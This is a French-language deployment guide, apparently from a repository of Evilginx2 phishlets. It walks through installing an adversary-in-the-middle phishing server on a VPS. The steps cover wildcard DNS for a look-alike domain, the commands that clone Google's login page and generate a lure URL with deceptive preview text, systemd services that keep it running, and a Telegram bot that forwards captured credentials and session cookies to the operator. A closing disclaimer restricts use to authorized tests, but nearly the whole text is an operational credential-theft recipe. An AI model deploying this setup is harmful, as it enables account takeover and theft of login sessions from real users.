# 🚀 GUIDE DE DÉPLOIEMENT SUR VPS

## 📋 Prérequis

### Matériel requis
- **VPS** : Ubuntu 20.04/22.04 ou Debian 11/12
- **RAM** : Minimum 2 GB (4 GB recommandé)
- **CPU** : 2 cores minimum
- **Stockage** : 20 GB minimum
- **Accès** : SSH root

### Comptes nécessaires
- ✅ Compte VPS (DigitalOcean, Vultr, AWS, etc.)
- ✅ Domaine (Namecheap, GoDaddy, etc.)
- ✅ Bot Telegram (via @BotFather)
- ✅ Certificat SSL (Let's Encrypt - automatique)

---

## 🎯 MÉTHODE 1 : INSTALLATION AUTOMATIQUE (Recommandée)

### Étape 1 : Connexion au VPS

```bash
# Depuis votre ordinateur local
ssh root@VOTRE_IP_VPS
```

### Étape 2 : Télécharger la collection

```bash
# Cloner le repository
cd /opt
git clone https://github.com/VOTRE_USERNAME/evilginx-pro-collection.git
cd evilginx-pro-collection

# Rendre le script exécutable
chmod +x scripts/install_vps.sh
```

### Étape 3 : Lancer l'installation

```bash
# Exécuter l'installation automatique
bash scripts/install_vps.sh
```

**Ce script va automatiquement :**
- ✅ Mettre à jour le système
- ✅ Installer Go, Python, Git
- ✅ Compiler Evilginx2
- ✅ Copier les phishlets
- ✅ Configurer les services systemd
- ✅ Installer l'environnement Python

**Durée estimée : 5-10 minutes**

### Étape 4 : Configuration de Telegram

```bash
# Éditer le script de notification
nano /opt/evilginx-pro-collection/scripts/telegram_notifier.py
```

**Modifier ces lignes :**
```python
TELEGRAM_BOT_TOKEN = "VOTRE_BOT_TOKEN"  # Obtenu via @BotFather
TELEGRAM_CHAT_ID = "VOTRE_CHAT_ID"      # Obtenu via @userinfobot
```

**Sauvegarder** : `CTRL + X` → `Y` → `ENTER`

### Étape 5 : Configuration DNS

**Sur votre registrar de domaine (ex: Namecheap) :**

```
Type    Nom         Valeur              TTL
-----   ----------  ------------------  -----
A       @           VOTRE_IP_VPS        300
A       *           VOTRE_IP_VPS        300
```

**Exemple avec `evil-domain.com` :**
- `evil-domain.com` → `203.0.113.45`
- `*.evil-domain.com` → `203.0.113.45`

**⏱️ Attendre 5-10 minutes pour la propagation DNS**

### Étape 6 : Configuration d'Evilginx

```bash
# Lancer Evilginx en mode interactif
cd /opt/evilginx2
./evilginx -p /root/.evilginx/phishlets
```

**Dans le prompt Evilginx :**
```
: config domain votre-domaine.com
: config ip VOTRE_IP_VPS

: phishlets hostname google accounts.votre-domaine.com
: phishlets enable google

: lures create google
: lures edit 0 redirect_url https://www.google.com
: lures get-url 0
```

**Copier l'URL générée** pour vos tests !

### Étape 7 : Lancer les services

```bash
# Quitter Evilginx (CTRL+C) et lancer en service
systemctl start evilginx
systemctl start telegram_notifier

# Vérifier le statut
systemctl status evilginx
systemctl status telegram_notifier
```

### Étape 8 : Vérifier les logs

```bash
# Logs Evilginx
journalctl -u evilginx -f

# Logs Telegram
journalctl -u telegram_notifier -f
```

---

## 🛠️ MÉTHODE 2 : INSTALLATION MANUELLE

### Étape 1 : Préparation du système

```bash
# Mise à jour
apt update && apt upgrade -y

# Installation des dépendances
apt install -y git golang python3 python3-pip python3-venv wget curl screen
```

### Étape 2 : Installation de Go (si nécessaire)

```bash
# Télécharger Go
cd /tmp
wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz

# Extraire
tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz

# Configurer PATH
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

# Vérifier
go version
```

### Étape 3 : Installation d'Evilginx2

```bash
# Cloner le repository
cd /opt
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Compiler
go build

# Vérifier
./evilginx -h
```

### Étape 4 : Installation des phishlets

```bash
# Créer le dossier
mkdir -p /root/.evilginx/phishlets

# Cloner la collection
cd /opt
git clone https://github.com/VOTRE_USERNAME/evilginx-pro-collection.git

# Copier les phishlets
cp /opt/evilginx-pro-collection/phishlets/*.yaml /root/.evilginx/phishlets/
```

### Étape 5 : Configuration Python pour Telegram

```bash
cd /opt/evilginx-pro-collection

# Créer l'environnement virtuel
python3 -m venv .venv
source .venv/bin/activate

# Installer les dépendances
pip install --upgrade pip
pip install requests

# Éditer le script
nano scripts/telegram_notifier.py
# → Modifier TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID
```

### Étape 6 : Configuration des services systemd

**Créer le service Evilginx :**
```bash
nano /etc/systemd/system/evilginx.service
```

**Contenu :**
```ini
[Unit]
Description=Evilginx Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx2
ExecStart=/opt/evilginx2/evilginx -p /root/.evilginx/phishlets
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Créer le service Telegram :**
```bash
nano /etc/systemd/system/telegram_notifier.service
```

**Contenu :**
```ini
[Unit]
Description=Evilginx Telegram Notifier
After=network.target evilginx.service

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx-pro-collection
ExecStart=/opt/evilginx-pro-collection/.venv/bin/python /opt/evilginx-pro-collection/scripts/telegram_notifier.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Activer les services :**
```bash
systemctl daemon-reload
systemctl enable evilginx
systemctl enable telegram_notifier
```

### Étape 7 : Configuration du pare-feu

```bash
# UFW (Ubuntu/Debian)
ufw allow 22/tcp      # SSH
ufw allow 80/tcp      # HTTP
ufw allow 443/tcp     # HTTPS
ufw enable

# Vérifier
ufw status
```

---

## 📱 CONFIGURATION TELEGRAM

### 1. Créer un bot Telegram

```
1. Ouvrir Telegram
2. Chercher @BotFather
3. Envoyer /newbot
4. Suivre les instructions
5. Copier le TOKEN reçu
```

### 2. Obtenir votre Chat ID

```
1. Chercher @userinfobot sur Telegram
2. Envoyer /start
3. Copier votre ID
```

### 3. Tester le bot

```bash
# Tester l'envoi de message
curl -X POST \
  "https://api.telegram.org/bot<VOTRE_TOKEN>/sendMessage" \
  -d "chat_id=<VOTRE_CHAT_ID>" \
  -d "text=Test depuis VPS"
```

---

## 🎯 CONFIGURATION EXEMPLE : GOOGLE PHISHING

### Configuration DNS

```
accounts.evil-domain.com    → VOTRE_IP
```

### Configuration Evilginx

```bash
cd /opt/evilginx2
./evilginx -p /root/.evilginx/phishlets
```

**Commandes :**
```
: config domain evil-domain.com
: config ip VOTRE_IP_VPS

: phishlets hostname google accounts.evil-domain.com
: phishlets enable google

: lures create google
: lures edit 0 redirect_url https://google.com
: lures edit 0 info "Campagne Test"
: lures edit 0 og_title "Google Account Login"
: lures edit 0 og_desc "Sign in to your Google Account"
: lures get-url 0
```

### Test

```bash
# Copier l'URL générée
# Exemple : https://accounts.evil-domain.com/kR8sD3

# Ouvrir dans un navigateur
# Se connecter avec un compte test
# Vérifier Telegram pour la notification
```

---

## 🔍 DÉPANNAGE

### Problème : Evilginx ne démarre pas

```bash
# Vérifier les logs
journalctl -u evilginx -n 50

# Vérifier le port 443
netstat -tulpn | grep 443

# Tuer les processus bloquants
lsof -ti:443 | xargs kill -9
```

### Problème : Certificat SSL invalide

```bash
# Vérifier la configuration DNS
dig @8.8.8.8 accounts.votre-domaine.com

# Vérifier la résolution
nslookup accounts.votre-domaine.com

# Forcer le renouvellement
: certs
```

### Problème : Pas de notifications Telegram

```bash
# Vérifier le service
systemctl status telegram_notifier

# Vérifier les logs
journalctl -u telegram_notifier -n 50

# Tester manuellement
cd /opt/evilginx-pro-collection
source .venv/bin/activate
python3 scripts/telegram_notifier.py
```

### Problème : Base de données introuvable

```bash
# Vérifier l'emplacement
ls -la /root/.evilginx/

# Créer si nécessaire
mkdir -p /root/.evilginx

# Lancer Evilginx une fois pour créer la DB
cd /opt/evilginx2
./evilginx -p /root/.evilginx/phishlets
# CTRL+C après quelques secondes
```

---

## 🔒 SÉCURITÉ

### Bonnes pratiques

```bash
# 1. Changer le port SSH
nano /etc/ssh/sshd_config
# → Port 2222
systemctl restart sshd

# 2. Désactiver root login
nano /etc/ssh/sshd_config
# → PermitRootLogin no

# 3. Installer fail2ban
apt install fail2ban
systemctl enable fail2ban
systemctl start fail2ban

# 4. Activer les mises à jour automatiques
apt install unattended-upgrades
dpkg-reconfigure --priority=low unattended-upgrades
```

### Sauvegarde

```bash
# Sauvegarder la base de données
cp /root/.evilginx/data.db /root/backup_$(date +%F).db

# Sauvegarder la configuration
tar -czf /root/evilginx_backup_$(date +%F).tar.gz \
  /root/.evilginx/ \
  /opt/evilginx-pro-collection/ \
  /etc/systemd/system/evilginx.service \
  /etc/systemd/system/telegram_notifier.service
```

---

## 📊 MONITORING

### Commandes utiles

```bash
# Statut des services
systemctl status evilginx telegram_notifier

# Logs en temps réel
journalctl -u evilginx -f
journalctl -u telegram_notifier -f

# Ressources système
htop
df -h
free -h

# Connexions actives
netstat -tulpn

# Sessions capturées
cd /opt/evilginx2
./evilginx -p /root/.evilginx/phishlets
: sessions
```

### Dashboard Web (optionnel)

Pour accéder à Evilginx via l'interface web :

```bash
# Dans Evilginx
: config redirect_url https://google.com
: blacklist off
```

---

## 🎓 CHECKLIST FINALE

### Avant le déploiement

- [ ] VPS configuré (Ubuntu/Debian)
- [ ] Domaine acheté et configuré
- [ ] DNS propagé (A et wildcard)
- [ ] Bot Telegram créé
- [ ] Chat ID récupéré
- [ ] Pare-feu configuré
- [ ] Certificats SSL valides

### Après le déploiement

- [ ] Evilginx démarre correctement
- [ ] Phishlet activé et fonctionnel
- [ ] Telegram reçoit les notifications
- [ ] Test de phishing effectué
- [ ] Logs vérifiés
- [ ] Sauvegarde configurée

### Tests de validation

- [ ] URL de phishing accessible
- [ ] Certificat SSL valide (cadenas vert)
- [ ] Page de login identique à l'original
- [ ] Credentials capturés
- [ ] Cookies capturés
- [ ] Notification Telegram reçue
- [ ] Redirection post-login fonctionnelle

---

## 📚 RESSOURCES

### Documentation officielle
- [Evilginx2 GitHub](https://github.com/kgretzky/evilginx2)
- [Documentation Evilginx](https://help.evilginx.com)
- [API Telegram Bot](https://core.telegram.org/bots/api)

### Fournisseurs VPS recommandés
- [DigitalOcean](https://digitalocean.com) - $5/mois
- [Vultr](https://vultr.com) - $5/mois
- [Linode](https://linode.com) - $5/mois
- [OVH](https://ovh.com) - €3.50/mois

### Registrars de domaines
- [Namecheap](https://namecheap.com) - ~$10/an
- [Google Domains](https://domains.google) - $12/an
- [Cloudflare](https://cloudflare.com) - $8/an

---

## ⚠️ AVERTISSEMENT LÉGAL

**CES OUTILS SONT DESTINÉS UNIQUEMENT À :**
- ✅ Tests de sécurité autorisés par écrit
- ✅ Exercices red team avec autorisation
- ✅ Formation en cybersécurité
- ✅ Recherche académique

**UTILISATION ILLÉGALE STRICTEMENT INTERDITE**

L'utilisation non autorisée de ces outils peut entraîner :
- Poursuites judiciaires
- Amendes importantes
- Emprisonnement
- Bannissement permanent

**Utilisez de manière responsable et éthique uniquement.**

---

## 🆘 SUPPORT

Pour toute question :

1. Consulter la documentation dans `/docs`
2. Vérifier les logs : `journalctl -u evilginx -n 100`
3. Tester la configuration manuellement
4. Consulter les issues GitHub d'Evilginx2

---

**🚀 Bon déploiement et tests de sécurité responsables !**

_Guide créé le 6 janvier 2026_  
_Compatible avec Evilginx2 3.0+ | Ubuntu 20.04+ | Debian 11+_
